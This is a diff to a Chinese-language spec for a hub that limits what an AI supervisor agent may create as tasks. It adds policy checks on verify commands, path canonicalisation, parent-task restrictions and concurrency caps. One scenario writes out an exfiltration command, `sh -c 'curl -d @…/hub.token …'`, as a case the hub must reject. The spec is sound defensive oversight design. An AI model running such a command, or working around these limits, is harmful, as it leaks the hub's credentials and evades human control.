@@ -93,7 +93,7 @@ workspace 配置 SHALL 支持 `supervisor.enabled`（缺省 true，仅在存在 
 - **THEN** 不创建唤醒任务、不写 `task.reply_delegated`，卡住按普通条目推送给用户；doctor 显示"global 不启用 supervisor"
 
 ### Requirement: supervisor 建任务的约束
-中枢对 supervisor 身份的建任务请求 SHALL 依次检查：`parent` 是本 workspace 未结束的唤醒任务（否则 `parent_required`）；目标角色有效类别为 write 且唤醒 origin 为 autonomous 时拒绝（403 `proposal_required`）；目标类别为 merge 或 supervisor 时拒绝（403 `role_not_allowed`）；`cwd` 与 `inputs.repo` 位于本 workspace 登记仓库内（否则 `repo_not_in_workspace`）。
+中枢对 supervisor 身份的建任务请求 SHALL 依次检查：`parent` 是本 workspace 未结束的唤醒任务（否则 `parent_required`）；目标角色有效类别为 write 且唤醒 origin 为 autonomous 时拒绝（403 `proposal_required`）；目标类别为 merge 或 supervisor 时拒绝（403 `role_not_allowed`）；`cwd` 与 `inputs.repo` 位于本 workspace 登记仓库内（先词法 resolve 再 realpath 比较，通过后写回规范化路径；否则 `repo_not_in_workspace`）；合同带 `verify` 时，每条验收命令经策略判定为 `auto` 或 `auto-report`（否则 403 `verify_not_allowed`）。非 user 身份建的任务只要带 `verify`，有效类别至少为 write；verify 的策略判定对所有非 user 身份适用。唤醒任务只能由 hub、user 与绑定该唤醒的 supervisor 作为 `parent`，其他身份返回 `parent_required`。
 
 #### Scenario: 指令派生可以直接建 dev 任务
 - **WHEN** instruction 唤醒中 supervisor 建 dev 任务
@@ -111,12 +111,28 @@ workspace 配置 SHALL 支持 `supervisor.enabled`（缺省 true，仅在存在 
 - **WHEN** supervisor 建的任务 `cwd` 为 `~/flow-home`
 - **THEN** 返回 `repo_not_in_workspace`
 
+#### Scenario: 借验收命令外传
+- **WHEN** autonomous 唤醒中 supervisor 建一个 triage 任务，`verify` 为 `sh -c 'curl -d @…/hub.token …'`
+- **THEN** 返回 403 `proposal_required`；在 instruction 唤醒中同样的命令返回 403 `verify_not_allowed`
+
+#### Scenario: 白名单内的验收命令
+- **WHEN** `policies.yaml` 启用了 `scope: ws/product-res action: tool:Verify level: auto when: {command_prefix: pnpm test}`，instruction 唤醒中 supervisor 建带 `verify: [pnpm test]` 的 dev 任务
+- **THEN** 任务被创建；未启用该规则时返回 `verify_not_allowed`
+
+#### Scenario: 其他 AI 挂到唤醒下
+- **WHEN** reviewer 身份建任务，`parent` 为某个唤醒任务
+- **THEN** 返回 `parent_required`
+
 ### Requirement: 硬性上限
 中枢 SHALL 按 workspace 配置 `supervisor.limits` 强制上限，默认：每次唤醒建任务 5 个、每 workspace 每天普通唤醒 24 次（其中 autonomous 最多 4 次，不含 reply 唤醒）、每天 reply 唤醒 48 次（超出时委托立即转交用户）、`parent` 链深度 8、同一 PR `changes_requested` 2 轮、未回答提问 3 条。建任务超限返回 `limit_exceeded` 或 `review_rounds_exceeded`；每日唤醒超限时事件留在队列，并生成一条 Decide 条目，用户可用 `--release` 放行。
 
 #### Scenario: 第三轮修改
-- **WHEN** 同一 PR 已两次得到 `changes_requested`，supervisor 再为它建 dev 任务
+- **WHEN** 同一 PR 已两次得到 `changes_requested`，由审查结束触发的唤醒中 supervisor 再建 dev 任务（不论合同是否写出 PR 链接），或任意唤醒中建 `inputs.pr` 为该 PR 的 dev 任务
 - **THEN** 返回 `review_rounds_exceeded`
+
+#### Scenario: 并发建任务
+- **WHEN** 同一唤醒同时发出 12 个建任务请求
+- **THEN** 最多创建 `tasks_per_wake`（默认 5）个，其余返回 `limit_exceeded`
 
 #### Scenario: 每日上限
 - **WHEN** 当天第 25 个唤醒事件到达
